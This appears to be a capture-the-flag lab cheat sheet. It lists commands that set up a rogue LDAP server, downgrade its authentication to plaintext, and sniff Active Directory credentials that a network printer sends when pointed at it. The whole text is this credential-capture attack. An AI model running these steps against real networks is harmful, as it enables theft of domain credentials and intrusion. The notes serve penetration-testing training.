## Force Printer Server On AD to return AD credentials

- Configure LDAP Rogue Server
```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```
- Choose No to omit slapd config
- Change DNS domain name to target domain name
- Change Org Name also to targe domain name
- No to purge database
- yes to Move old database

- Create New file to auth with plain text (downgrading)
- nano olcSaslSecProps.ldif and add
```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
- modify ldap server
```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
- Check Config ( No message in kali )
```
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```
-Output will be
```
         
[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

- Capture and read with TCPdump
```
sudo tcpdump -SX -i breachad tcp port 389
```
